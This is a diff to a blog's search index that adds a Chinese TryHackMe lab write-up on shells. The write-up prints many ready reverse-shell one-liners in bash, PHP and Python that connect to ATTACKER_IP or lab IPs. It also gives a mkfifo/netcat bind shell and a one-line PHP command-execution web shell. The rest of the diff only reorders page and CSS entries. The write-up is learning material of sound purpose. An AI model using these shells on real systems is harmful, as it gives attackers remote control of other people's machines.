@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>tryhackme-shell：概括</title>
+      <link href="/2025/03/14/tryhackme-shell%EF%BC%9A%E6%A6%82%E6%8B%AC/"/>
+      <url>/2025/03/14/tryhackme-shell%EF%BC%9A%E6%A6%82%E6%8B%AC/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="/images/tryhackme-shell%EF%BC%9A%E6%A6%82%E6%8B%AC/title.png" alt="title"><br>学习目标<br>在这个房间中，我们将讨论以下学习目标：</p><p>了解进攻性安全中的 Shell<br>设置并使用反向和绑定 Shell<br>部署 Web Shell </p><h2 id="task2"><a href="#task2" class="headerlink" title="task2"></a>task2</h2><p>什么是 Shell？<br>Shell 是一种允许用户与操作系统交互的软件。它可以是图形界面，但通常是命令行界面，这取决于目标系统上运行的操作系统。</p><p>在网络安全中，它通常指攻击者在访问受感染系统时使用的特定 shell 会话，允许他们运行命令和执行软件。这 将允许攻击者执行多项活动，其中一些活动如下所述。</p><ul><li><p>远程系统控制：允许攻击者在目标系统中远程执行命令或软件。<br>权限提升：如果通过 shell 的初始访问受到限制，攻击者可以探索将权限提升到更高级或管理访问权限的方法。</p></li><li><p>数据泄露：一旦攻击者获得 shell 的执行权限，他们就可以探索系统并读取和复制敏感数据。</p></li><li><p>持久性和维护性访问：一旦获得 shell 访问权限，攻击者可以通过用户和凭据创建访问权限或复制后门软件以维持对目标系统的访问权限以供日后使用。</p></li><li><p>后利用活动：获得对 shell 的访问权限后，攻击者可以执行各种后利用活动，例如部署恶意软件、创建隐藏帐户和删除信息。</p></li><li><p>访问网络上的其他系统：根据攻击者的意图，获得的 shell 可能只是一个初始访问点。目标可能是使用获得的 shell 作为枢轴，通过网络跳转到不同的目标，到达受感染系统网络中的不同点。这也称为枢轴转移(pivoting)。</p></li></ul><p><img src="/images/tryhackme-shell%EF%BC%9A%E6%A6%82%E6%8B%AC/task2.png" alt="task2"></p><p>第一问是shell</p><p>第二问是用枢轴转移(pivoting)</p><p>第三问是用Privilege Escalation（权限提升）</p><h2 id="task3"><a href="#task3" class="headerlink" title="task3"></a>task3</h2><p>反向 Shell(Reverse Shell)</p><p>反向 shell（有时也称为“连接回 shell”）是网络攻击中获取系统访问权限的最常用技术之一。连接从目标系统发起到攻击者的机器，这可以帮助避免被网络防火墙和其他安全设备检测到。</p><p>反向 Shell 的工作原理<br>设置 Netcat（nc）监听器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">attacker@kali:~$ nc -lvnp 443</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line"></span><br><span class="line"># -l 选项指示 Netcat 监听或等待连接。</span><br><span class="line"># -v选项启用详细模式。</span><br><span class="line"># -n选项阻止连接使用 DNS 进行查找，因此它不会解析任何主机名，而是使用 IP 地址。</span><br><span class="line"># -p标志指示将用于等待连接的端口</span><br></pre></td></tr></table></figure><p>还有很多反向shell的使用 可以看这个<a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">网站</a></p><p><img src="/images/tryhackme-shell%EF%BC%9A%E6%A6%82%E6%8B%AC/task3.png" alt="task3"></p><p>第一问毋庸置疑 reverse shell 反向shell</p><p>第二问使用netcat工具</p><h2 id="task4"><a href="#task4" class="headerlink" title="task4"></a>task4</h2><p>绑定 Shell(Bind Shell)<br>顾名思义，绑定 shell 将绑定受感染系统上的端口并监听连接；当发生此连接时，它会暴露 shell 会话，以便攻击者可以远程执行命令。</p><p>当受感染目标不允许传出连接时可以使用这种方法，但它往往不太受欢迎，因为它需要保持活动状态并监听连接，这可能导致检测。</p><p>绑定 shell 的工作原理<br>在目标上设置绑定 Shell</p><p>让我们创建一个绑定 shell。在这种情况下，攻击者可以在目标机器上使用如下命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2&gt;&amp;1 | nc -l 0.0.0.0 8080 &gt; /tmp/f</span><br></pre></td></tr></table></figure><p>有效载荷的解释</p><ul><li><p>rm -f &#x2F;tmp&#x2F;f- 此命令将删除位于 的任何现有命名管道文件&#x2F;tmp&#x2F;f&#x2F;。这可确保脚本可以创建新的命名管道而不会发生冲突。</p></li><li><p>mkfifo &#x2F;tmp&#x2F;f- 此命令在 处创建一个命名管道或 FIFO &#x2F;tmp&#x2F;f。命名管道允许进程之间进行双向通信。在这种情况下，它充当输入和输出的管道。</p></li><li><p>cat &#x2F;tmp&#x2F;f- 此命令从命名管道读取数据。它等待可以通过管道发送的输入。</p></li><li><p>| bash -i 2&gt;&amp;1- 的输出 cat通过管道传输到 shell 实例 ( bash -i)，这允许攻击者以交互方式执行命令。 将2&gt;&amp;1标准错误重定向到标准输出，确保将错误消息返回给攻击者。</p></li><li><p>| nc -l 0.0.0.0 8080-l-在所有接口 ( 0.0.0.0) 和端口上以监听模式 ( ) 启动 Netcat 80</p></li><li><blockquote><p>&#x2F;tmp&#x2F;f 最后部分将命令的输出发送回命名管道，实现双向通信。</p></blockquote></li></ul><p>低于 1024 的端口将需要提升的权限执行 Netcat</p><p>攻击者连接到Bind Shell</p><p>现在目标机器正在等待传入连接，我们可以再次使用 Netcat 使用以下命令进行连接。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nv TARGET_IP 8080</span><br></pre></td></tr></table></figure><p>命令说明<br>nc- 这将调用 Netcat，建立与目标的连接。<br>-n- 禁用DNS解析，使 Netcat 运行得更快并避免不必要的查找。<br>-v- 详细模式提供连接过程的详细输出，例如连接何时建立。<br>TARGET_IP- 运行绑定 shell 的目标机器的 IP 地址。<br>8080- 绑定 shell 监听的端口号。</p><p><img src="/images/tryhackme-shell%EF%BC%9A%E6%A6%82%E6%8B%AC/task4.png" alt="task4"></p><p>第一问是bind shell</p><p>第二问是1024 低于1024的都需要提升权限才能使用</p><h2 id="task5"><a href="#task5" class="headerlink" title="task5"></a>task5</h2><p>shell监听器</p><h3 id="1-Rlwrap"><a href="#1-Rlwrap" class="headerlink" title="1. Rlwrap"></a>1. Rlwrap</h3><p>它是一个小型实用程序，使用 GNU readline 库来提供编辑键盘和历史记录。</p><p>使用示例（使用 Rlwrap 增强 Netcat Shell）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">attacker@kali:~$ rlwrap nc -lvnp 443</span><br><span class="line">listening on [any] 443 ...</span><br></pre></td></tr></table></figure><p>允许使用箭头键和历史记录等功能实现更好的交互。</p><h3 id="2-Ncat"><a href="#2-Ncat" class="headerlink" title="2. Ncat"></a>2. Ncat</h3><p>Ncat<br>Ncat 是NMAP项目发布的 Netcat 的改进版本。它提供了加密（SSL）等额外功能。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">attacker@kali:~$ ncat --ssl -lvnp 4444</span><br><span class="line">Ncat: Version 7.94SVN ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.</span><br><span class="line">Ncat: SHA-1 fingerprint: B7AC F999 7FB0 9FF9 14F5 5F12 6A17 B0DC B094 AB7F</span><br><span class="line">Ncat: Listening on [::]:443</span><br><span class="line">Ncat: Listening on 0.0.0.0:443</span><br></pre></td></tr></table></figure><h3 id="3-Socat"><a href="#3-Socat" class="headerlink" title="3. Socat"></a>3. Socat</h3><p>它是一个实用程序，允许您在两个数据源（在本例中是两个不同的主机）之间创建套接字连接。</p><p>默认使用示例（监听反向 Shell）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">attacker@kali:~$ socat -d -d TCP-LISTEN:443 STDOUT</span><br><span class="line">2024/09/23 15:44:38 socat[41135] N listening on AF=2 0.0.0.0:443</span><br></pre></td></tr></table></figure><p>上述命令使用了-d选项来启用详细输出；再次使用 -d 将增加命令的详细程度。<br>该选项在端口 上TCP-LISTEN:443创建一个TCP443侦听器，为传入连接建立服务器套接字。最后，STDOUT选项将所有传入数据定向到终端。</p><p><img src="/images/tryhackme-shell%EF%BC%9A%E6%A6%82%E6%8B%AC/task5.png" alt="task5"></p><h2 id="task6"><a href="#task6" class="headerlink" title="task6"></a>task6</h2><h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><h4 id="1-普通-Bash-反向-Shell"><a href="#1-普通-Bash-反向-Shell" class="headerlink" title="1. 普通 Bash 反向 Shell"></a>1. 普通 Bash 反向 Shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target@tryhackme:~$ bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/443 0&gt;&amp;1 </span><br></pre></td></tr></table></figure><p>该反向 shell 启动一个交互式 bash shell，该 shell 通过TCP连接将输入和输出重定向到攻击者的 IP（ATTACKER_IP）上的端口443。&gt;&amp;运算符结合了标准输出和标准错误。</p><h4 id="2-Bash-读取行-反向-Shell"><a href="#2-Bash-读取行-反向-Shell" class="headerlink" title="2. Bash 读取行 反向 Shell"></a>2. Bash 读取行 反向 Shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target@tryhackme:~$ exec 5&lt;&gt;/dev/tcp/ATTACKER_IP/443; cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done </span><br></pre></td></tr></table></figure><p>此反向 shell 创建一个新的文件描述符（5 在本例中）并连接到TCP套接字。它将从套接字读取并执行命令，并通过同一套接字将输出发回。</p><h4 id="3-带有文件描述符-196-的-Bash-反向-Shell"><a href="#3-带有文件描述符-196-的-Bash-反向-Shell" class="headerlink" title="3. 带有文件描述符 196 的 Bash 反向 Shell"></a>3. 带有文件描述符 196 的 Bash 反向 Shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target@tryhackme:~$ 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/ATTACKER_IP/443; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196 </span><br></pre></td></tr></table></figure><p>此反向 shell 使用文件描述符（196 在本例中）建立TCP连接。它允许 shell 从网络读取命令并通过同一连接发送输出。</p><h4 id="4-使用文件描述符-5-的-Bash-反向-Shell"><a href="#4-使用文件描述符-5-的-Bash-反向-Shell" class="headerlink" title="4. 使用文件描述符 5 的 Bash 反向 Shell"></a>4. 使用文件描述符 5 的 Bash 反向 Shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target@tryhackme:~$ bash -i 5&lt;&gt; /dev/tcp/ATTACKER_IP/443 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5</span><br></pre></td></tr></table></figure><p>与第一个例子类似，此命令打开一个 shell ( bash -i)，但它使用文件描述符进行输入和输出，从而通过TCP5连接实现交互式会话。</p><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><h4 id="1-使用-exec-函数实现PHP反向-Shell"><a href="#1-使用-exec-函数实现PHP反向-Shell" class="headerlink" title="1. 使用 exec 函数实现PHP反向 Shell"></a>1. 使用 exec 函数实现PHP反向 Shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target@tryhackme:~$ php -r &#x27;$sock=fsockopen(&quot;ATTACKER_IP&quot;,443);exec(&quot;sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27; </span><br></pre></td></tr></table></figure><p>该反向shell 在端口上创建到攻击者IP的套接字连接443，并使用该 exec 函数执行shell，重定向标准输入和输出。</p><h4 id="2-使用shell-exec-函数实现PHP反向-Shell"><a href="#2-使用shell-exec-函数实现PHP反向-Shell" class="headerlink" title="2. 使用shell_exec 函数实现PHP反向 Shell"></a>2. 使用shell_exec 函数实现PHP反向 Shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target@tryhackme:~$ php -r &#x27;$sock=fsockopen(&quot;ATTACKER_IP&quot;,443);shell_exec(&quot;sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure><p>与上一个命令类似，但使用 shell_exec 函数。</p><h4 id="3-使用-system-函数实现PHP反向-Shell"><a href="#3-使用-system-函数实现PHP反向-Shell" class="headerlink" title="3. 使用 system 函数实现PHP反向 Shell"></a>3. 使用 system 函数实现PHP反向 Shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target@tryhackme:~$ php -r &#x27;$sock=fsockopen(&quot;ATTACKER_IP&quot;,443);system(&quot;sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27; </span><br></pre></td></tr></table></figure><p>该反向shell 采用了system 函数，执行命令并将结果输出到浏览器。</p><h4 id="4-使用-passthru-函数实现PHP反向-Shell"><a href="#4-使用-passthru-函数实现PHP反向-Shell" class="headerlink" title="4.使用 passthru 函数实现PHP反向 Shell"></a>4.使用 passthru 函数实现PHP反向 Shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target@tryhackme:~$ php -r &#x27;$sock=fsockopen(&quot;ATTACKER_IP&quot;,443);passthru(&quot;sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure><p>passthru函数执行命令并将原始输出发送回浏览器。这在处理二进制数据时很有用。</p><h4 id="5-使用-popen-函数实现PHP反向-Shell"><a href="#5-使用-popen-函数实现PHP反向-Shell" class="headerlink" title="5.使用 popen 函数实现PHP反向 Shell"></a>5.使用 popen 函数实现PHP反向 Shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target@tryhackme:~$ php -r &#x27;$sock=fsockopen(&quot;ATTACKER_IP&quot;,443);popen(&quot;sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;, &quot;r&quot;);&#x27; </span><br></pre></td></tr></table></figure><p>反向shell用于popen打开进程文件指针，从而允许执行shell。</p><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><h4 id="1-通过导出环境变量获取-Python-反向-Shell"><a href="#1-通过导出环境变量获取-Python-反向-Shell" class="headerlink" title="1.通过导出环境变量获取 Python 反向 Shell"></a>1.通过导出环境变量获取 Python 反向 Shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target@tryhackme:~$ export RHOST=&quot;ATTACKER_IP&quot;; export RPORT=443; python -c &#x27;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;bash&quot;)&#x27; </span><br></pre></td></tr></table></figure><p>该反向 shell 将远程主机和端口设置为环境变量，创建套接字连接，并复制套接字文件描述符以用于标准输入&#x2F;输出。</p><h4 id="2-使用-subprocess-模块的-Python-反向-Shell"><a href="#2-使用-subprocess-模块的-Python-反向-Shell" class="headerlink" title="2.使用 subprocess 模块的 Python 反向 Shell"></a>2.使用 subprocess 模块的 Python 反向 Shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target@tryhackme:~$ python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.4.99.209&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;bash&quot;)&#x27; </span><br></pre></td></tr></table></figure><p>该反向shell使用该subprocess模块生成一个shell，并通过导出环境变量命令设置与Python反向shell类似的环境。</p><h4 id="3-简短的-Python-反向-Shell"><a href="#3-简短的-Python-反向-Shell" class="headerlink" title="3.简短的 Python 反向 Shell"></a>3.简短的 Python 反向 Shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target@tryhackme:~$ python -c &#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;ATTACKER_IP&quot;,443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>这个反向 shell 创建一个套接字 ( s)，连接到攻击者，并使用将标准输入、输出和错误重定向到套接字 os.dup2()。</p><p><img src="/images/tryhackme-shell%EF%BC%9A%E6%A6%82%E6%8B%AC/task6.png" alt="task6"></p><h2 id="task7"><a href="#task7" class="headerlink" title="task7"></a>task7</h2><p>web shell</p><p>Web Shell 是用受感染 Web 服务器支持的语言编写的脚本，可通过 Web 服务器本身执行命令。Web Shell 通常是一个文件，其中包含执行命令和处理文件的代码。它可以隐藏在受感染的 Web 应用程序或服务中，因此很难被发现，在攻击者中非常受欢迎。</p><p>PHP Web Shell示例<br>让我们看一个PHP Web Shell 示例来了解这个过程是如何工作的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&#x27;cmd&#x27;])) &#123;</span><br><span class="line">    system($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>上述shell可以保存到以PHP为扩展名的文件中，例如shell.php ，然后由攻击者利用无限制文件上传(Unrestricted File Upload)、文件包含(File Inclusion)、命令注入(Command Injection)等漏洞， 或通过获取未经授权的访问将其上传到Web服务器。  </p><p>在线web shell</p><p><a href="https://github.com/flozz/p0wny-shell">p0wny-shell</a>——一个简约的单文件PHP web shell，允许远程命令执行。</p><p><a href="https://github.com/b374k/b374k">b374k shell</a> - 功能更丰富的PHP web shell，具有文件管理和命令执行等功能。</p><p><img src="/images/tryhackme-shell%EF%BC%9A%E6%A6%82%E6%8B%AC/task7.png" alt="task7"></p><h2 id="task8"><a href="#task8" class="headerlink" title="task8"></a>task8</h2><p>来俩练练手<br><img src="/images/tryhackme-shell%EF%BC%9A%E6%A6%82%E6%8B%AC/task8.png" alt="task7"></p><p>第一问 我是用了反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2&gt;&amp;1 | nc  10.10.250.106 443 &gt;/tmp/f</span><br><span class="line"></span><br><span class="line">nc -lvnp 443</span><br></pre></td></tr></table></figure><p><img src="/images/tryhackme-shell%EF%BC%9A%E6%A6%82%E6%8B%AC/hash.png" alt="task7"></p><p><img src="/images/tryhackme-shell%EF%BC%9A%E6%A6%82%E6%8B%AC/flag1.png" alt="task7"></p><p>第二个事是简单写了一个php web shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&#x27;cmd&#x27;])) &#123;</span><br><span class="line">    system($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>先看看whoami 看一下用户</p><p><img src="/images/tryhackme-shell%EF%BC%9A%E6%A6%82%E6%8B%AC/whoami.png" alt="task8"></p><p>根据提示说 是在&#x2F;目录 我们ls &#x2F; 来看看文件</p><p><img src="/images/tryhackme-shell%EF%BC%9A%E6%A6%82%E6%8B%AC/ls.png" alt="task8"></p><p>发现了flag cat &#x2F;flag.txt</p><p><img src="/images/tryhackme-shell%EF%BC%9A%E6%A6%82%E6%8B%AC/flag2.png" alt="task8"></p><p>这个反弹shell和web shell是真的复杂 简单介绍到此</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> tryhackme linux </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>tryhackme-Gobuster：基础知识</title>
       <link href="/2025/03/13/tryhackme-Gobuster%EF%BC%9A%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
       <url>/2025/03/13/tryhackme-Gobuster%EF%BC%9A%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
@@ -644,17 +663,6 @@
     
     
     <entry>
-      <title>about</title>
-      <link href="/about/index-1.html"/>
-      <url>/about/index-1.html</url>
-      
-        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>network 网络概念</title>
       <link href="/about/network-%E7%BD%91%E7%BB%9C%E6%A6%82%E5%BF%B5.html"/>
       <url>/about/network-%E7%BD%91%E7%BB%9C%E6%A6%82%E5%BF%B5.html</url>
@@ -666,22 +674,11 @@
     
     
     <entry>
-      <title></title>
-      <link href="/css/music.css"/>
-      <url>/css/music.css</url>
+      <title>about</title>
+      <link href="/about/index-1.html"/>
+      <url>/about/index-1.html</url>
       
-        <content type="html"><![CDATA[.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {    left: -66px !important;    /* 默认情况下缩进左侧66px，只留一点箭头部分 */  }    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {    left: 0 !important;    /* 鼠标悬停是左侧缩进归零，完全显示按钮 */  }]]></content>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title></title>
-      <link href="/css/touming.css"/>
-      <url>/css/touming.css</url>
-      
-        <content type="html"><![CDATA[/* 文章页背景 */.layout_post>#post {  /* 透明度为 0.7 */  background: rgba(255, 255, 255, 0.7);}/* 所有页面背景 */#aside_content .card-widget, #recent-posts>.recent-post-item, .layout_page>div:first-child:not(.recent-posts), .layout_post>#page, .layout_post>#post, .read-mode .layout_post>#post {  /* 透明度为 0.7 */  background: rgba(255, 255, 255, 0.7);}/* 侧边卡片的透明度 */:root {  --card-bg: rgba(255, 255, 255, 0.7);}/* 页脚透明 */#footer {  /* 透明度为 0.7 */  background: rgba(255, 255, 255, 0.7);}]]></content>
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
       
     </entry>
     
@@ -710,20 +707,20 @@
     
     
     <entry>
-      <title>categories</title>
-      <link href="/categories/index.html"/>
-      <url>/categories/index.html</url>
+      <title></title>
+      <link href="/css/music.css"/>
+      <url>/css/music.css</url>
       
-        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
+        <content type="html"><![CDATA[.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {    left: -66px !important;    /* 默认情况下缩进左侧66px，只留一点箭头部分 */  }    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {    left: 0 !important;    /* 鼠标悬停是左侧缩进归零，完全显示按钮 */  }]]></content>
       
     </entry>
     
     
     
     <entry>
-      <title>movies</title>
-      <link href="/movies/index.html"/>
-      <url>/movies/index.html</url>
+      <title>categories</title>
+      <link href="/categories/index.html"/>
+      <url>/categories/index.html</url>
       
         <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
       
@@ -743,6 +740,28 @@
     
     
     <entry>
+      <title></title>
+      <link href="/css/touming.css"/>
+      <url>/css/touming.css</url>
+      
+        <content type="html"><![CDATA[/* 文章页背景 */.layout_post>#post {  /* 透明度为 0.7 */  background: rgba(255, 255, 255, 0.7);}/* 所有页面背景 */#aside_content .card-widget, #recent-posts>.recent-post-item, .layout_page>div:first-child:not(.recent-posts), .layout_post>#page, .layout_post>#post, .read-mode .layout_post>#post {  /* 透明度为 0.7 */  background: rgba(255, 255, 255, 0.7);}/* 侧边卡片的透明度 */:root {  --card-bg: rgba(255, 255, 255, 0.7);}/* 页脚透明 */#footer {  /* 透明度为 0.7 */  background: rgba(255, 255, 255, 0.7);}]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>search</title>
+      <link href="/search/index.html"/>
+      <url>/search/index.html</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>tags</title>
       <link href="/tags/index-1.html"/>
       <url>/tags/index-1.html</url>
@@ -754,9 +773,9 @@
     
     
     <entry>
-      <title>search</title>
-      <link href="/search/index.html"/>
-      <url>/search/index.html</url>
+      <title>tags</title>
+      <link href="/tags/index.html"/>
+      <url>/tags/index.html</url>
       
         <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
       
@@ -776,9 +795,9 @@
     
     
     <entry>
-      <title>tags</title>
-      <link href="/tags/index.html"/>
-      <url>/tags/index.html</url>
+      <title>movies</title>
+      <link href="/movies/index.html"/>
+      <url>/movies/index.html</url>
       
         <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
       
